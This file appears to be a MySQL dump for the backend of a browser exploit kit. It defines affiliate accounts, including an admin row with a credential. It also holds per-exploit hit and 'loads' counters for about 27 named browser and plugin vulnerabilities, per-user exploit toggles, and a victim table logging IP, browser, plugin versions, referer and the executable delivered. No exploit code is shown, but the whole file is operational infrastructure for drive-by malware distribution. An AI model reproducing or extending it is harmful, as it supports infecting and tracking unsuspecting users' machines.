SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


CREATE TABLE IF NOT EXISTS `affiliates` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `username` varchar(30) NOT NULL,
  `password` text NOT NULL,
  `affid` varchar(30) NOT NULL,
  `email` text NOT NULL,
  `cook` text NOT NULL,
  `filez` varchar(30) NOT NULL,
  `city` varchar(100) NOT NULL,
  `blankcheck` varchar(4) NOT NULL,
  `windowsonly` varchar(4) NOT NULL,
  `antivp` varchar(4) NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `username` (`username`,`affid`,`filez`,`city`),
  KEY `username_2` (`username`,`affid`),
  KEY `affid` (`antivp`,`username`),
  KEY `googlep` (`antivp`,`affid`),
  KEY `affid_2` (`affid`,`antivp`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `affiliates`
--

INSERT INTO `affiliates` (`id`, `username`, `password`, `affid`, `email`, `cook`, `filez`, `city`, `blankcheck`, `windowsonly`, `antivp`) VALUES
(1, 'Admin', 'tuTK5bNZfuw', 'admin', 'changeme', '5465754554', '', 'NONE', 'yes', 'yes', 'yes');

-- --------------------------------------------------------

--
-- Table structure for table `exploits`
--

CREATE TABLE IF NOT EXISTS `exploits` (
  `affid` text NOT NULL,
  `adobelibtiff` int(6) NOT NULL,
  `adobelibtiff_loads` int(6) NOT NULL,
  `adobenewplayer` int(6) NOT NULL,
  `adobenewplayer_loads` int(6) NOT NULL,
  `aol95` int(6) NOT NULL,
  `aol95_loads` int(6) NOT NULL,
  `aol_ampx` int(6) NOT NULL,
  `aol_ampx_loads` int(6) NOT NULL,
  `autodesk_iodrop` int(6) NOT NULL,
  `autodesk_iodrop_loads` int(6) NOT NULL,
  `awingsoftwinds3d` int(6) NOT NULL,
  `awingsoftwinds3d_loads` int(6) NOT NULL,
  `directshow` int(6) NOT NULL,
  `directshow_loads` int(6) NOT NULL,
  `icq_downloadagent` int(6) NOT NULL,
  `icq_downloadagent_loads` int(6) NOT NULL,
  `iepeers` int(6) NOT NULL,
  `iepeers_loads` int(6) NOT NULL,
  `iepeers7` int(6) NOT NULL,
  `iepeers7_loads` int(6) NOT NULL,
  `java_arginject` int(6) NOT NULL,
  `java_arginject_loads` int(6) NOT NULL,
  `javacalendar` int(6) NOT NULL,
  `javacalendar_loads` int(6) NOT NULL,
  `mozilla35` int(6) NOT NULL,
  `mozilla35_loads` int(6) NOT NULL,
  `mozilla_compareto` int(6) NOT NULL,
  `mozilla_compareto_loads` int(6) NOT NULL,
  `ms09_002` int(6) NOT NULL,
  `ms09_002_loads` int(6) NOT NULL,
  `ms09_043` int(6) NOT NULL,
  `ms09_043_loads` int(6) NOT NULL,
  `winds3d` int(6) NOT NULL,
  `winds3d_loads` int(6) NOT NULL,
  `javaCMM` int(6) NOT NULL,
  `javaCMM_loads` int(6) NOT NULL,
  `quicktime_marshaled` int(6) NOT NULL,
  `quicktime_marshaled_loads` int(6) NOT NULL,
  `shockwave` int(6) NOT NULL,
  `shockwave_loads` int(6) NOT NULL,
  `javadocbase` int(6) NOT NULL,
  `javadocbase_loads` int(6) NOT NULL,
  `eacheckreq` int(6) NOT NULL,
  `eacheckreq_loads` int(6) NOT NULL,
  `javadrive` int(6) NOT NULL,
  `javadrive_loads` int(6) NOT NULL,
  `ms11_xxx` int(6) NOT NULL,
  `ms11_xxx_loads` int(6) NOT NULL,
  `firefoxinter` int(6) NOT NULL,
  `firefoxinter_loads` int(6) NOT NULL,
  `realplayer_cdda` int(6) NOT NULL,
  `realplayer_cdda_loads` int(6) NOT NULL,
  `vlc_amv` int(6) NOT NULL,
  `vlc_amv_loads` int(6) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

--
-- Dumping data for table `exploits`
--

INSERT INTO `exploits` (`affid`, `adobelibtiff`, `adobelibtiff_loads`, `adobenewplayer`, `adobenewplayer_loads`, `aol95`, `aol95_loads`, `aol_ampx`, `aol_ampx_loads`, `autodesk_iodrop`, `autodesk_iodrop_loads`, `awingsoftwinds3d`, `awingsoftwinds3d_loads`, `directshow`, `directshow_loads`, `icq_downloadagent`, `icq_downloadagent_loads`, `iepeers`, `iepeers_loads`, `iepeers7`, `iepeers7_loads`, `java_arginject`, `java_arginject_loads`, `javacalendar`, `javacalendar_loads`, `mozilla35`, `mozilla35_loads`, `mozilla_compareto`, `mozilla_compareto_loads`, `ms09_002`, `ms09_002_loads`, `ms09_043`, `ms09_043_loads`, `winds3d`, `winds3d_loads`, `javaCMM`, `javaCMM_loads`, `quicktime_marshaled`, `quicktime_marshaled_loads`, `shockwave`, `shockwave_loads`, `javadocbase`, `javadocbase_loads`, `eacheckreq`, `eacheckreq_loads`, `javadrive`, `javadrive_loads`, `ms11_xxx`, `ms11_xxx_loads`, `firefoxinter`, `firefoxinter_loads`, `realplayer_cdda`, `realplayer_cdda_loads`, `vlc_amv`, `vlc_amv_loads`) VALUES
('admin', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `exploits_enabled`
--

CREATE TABLE IF NOT EXISTS `exploits_enabled` (
  `username` varchar(40) NOT NULL,
  `adobelibtiff` varchar(4) NOT NULL,
  `adobenewplayer` varchar(4) NOT NULL,
  `aol95` varchar(4) NOT NULL,
  `aol_ampx` varchar(4) NOT NULL,
  `autodesk_iodrop` varchar(4) NOT NULL,
  `awingsoftwinds3d` varchar(4) NOT NULL,
  `directshow` varchar(4) NOT NULL,
  `icq_downloadagent` varchar(4) NOT NULL,
  `iepeers` varchar(4) NOT NULL,
  `iepeers7` varchar(4) NOT NULL,
  `java_arginject` varchar(4) NOT NULL,
  `javacalendar` varchar(4) NOT NULL,
  `mozilla35` varchar(4) NOT NULL,
  `mozilla_compareto` varchar(4) NOT NULL,
  `ms09_002` varchar(4) NOT NULL,
  `ms09_043` varchar(4) NOT NULL,
  `winds3d` varchar(4) NOT NULL,
  `javaCMM` varchar(4) NOT NULL,
  `quicktime_marshaled` varchar(4) NOT NULL,
  `shockwave` varchar(4) NOT NULL,
  `javadocbase` varchar(4) NOT NULL,
  `eacheckreq` varchar(4) NOT NULL,
  `javadrive` varchar(4) NOT NULL,
  `ms11_xxx` varchar(4) NOT NULL,
  `firefoxinter` varchar(4) NOT NULL,
  `realplayer_cdda` varchar(4) NOT NULL,
  `vlc_amv` varchar(4) NOT NULL,
  KEY `username` (`username`,`adobelibtiff`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

--
-- Dumping data for table `exploits_enabled`
--

INSERT INTO `exploits_enabled` (`username`, `adobelibtiff`, `adobenewplayer`, `aol95`, `aol_ampx`, `autodesk_iodrop`, `awingsoftwinds3d`, `directshow`, `icq_downloadagent`, `iepeers`, `iepeers7`, `java_arginject`, `javacalendar`, `mozilla35`, `mozilla_compareto`, `ms09_002`, `ms09_043`, `winds3d`, `javaCMM`, `quicktime_marshaled`, `shockwave`, `javadocbase`, `eacheckreq`, `javadrive`, `ms11_xxx`, `firefoxinter`, `realplayer_cdda`, `vlc_amv`) VALUES
('Admin', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off');

-- --------------------------------------------------------

--
-- Table structure for table `hosts`
--

CREATE TABLE IF NOT EXISTS `hosts` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `ip` int(10) unsigned NOT NULL default '0',
  `browser` varchar(30) NOT NULL,
  `browser_version` varchar(30) NOT NULL,
  `os` varchar(30) NOT NULL,
  `os_flavor` varchar(30) NOT NULL,
  `service_pack` varchar(30) NOT NULL,
  `os_lang` varchar(30) NOT NULL,
  `country` varchar(6) NOT NULL,
  `arch` varchar(30) NOT NULL,
  `loads` varchar(3) NOT NULL,
  `exeload` text NOT NULL,
  `exploit` varchar(30) NOT NULL,
  `referer` text NOT NULL,
  `aff` varchar(30) NOT NULL,
  `java` varchar(30) NOT NULL,
  `adobe` varchar(30) NOT NULL,
  `quicktime` varchar(30) NOT NULL,
  `flash` varchar(30) NOT NULL,
  `shockwave` varchar(30) NOT NULL,
  `vlc` varchar(30) NOT NULL,
  `realplayer` varchar(30) NOT NULL,
  `time` timestamp NOT NULL default CURRENT_TIMESTAMP,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `ip` (`ip`),
  KEY `os` (`os`),
  KEY `os_2` (`os`,`os_flavor`,`browser`,`browser_version`,`exploit`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `hosts`
--


-- --------------------------------------------------------

--
-- Table structure for table `options`
--

CREATE TABLE IF NOT EXISTS `options` (
  `username` varchar(30) NOT NULL,
  `mode` varchar(10) NOT NULL,
  `submode` varchar(10) NOT NULL,
  `check_crash` varchar(5) NOT NULL,
  `time_bxpl` int(3) NOT NULL,
  `keyz` text NOT NULL,
  `percent_rand` int(3) NOT NULL,
  `showxpl` int(3) NOT NULL,
  `priority` varchar(10) NOT NULL,
  KEY `submode` (`submode`,`username`),
  KEY `username` (`username`,`submode`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

--
-- Dumping data for table `options`
--

INSERT INTO `options` (`username`, `mode`, `submode`, `check_crash`, `time_bxpl`, `keyz`, `percent_rand`, `showxpl`) VALUES
('Admin', 'ai', 'personal', 'yes', 0, '', 20, 2);
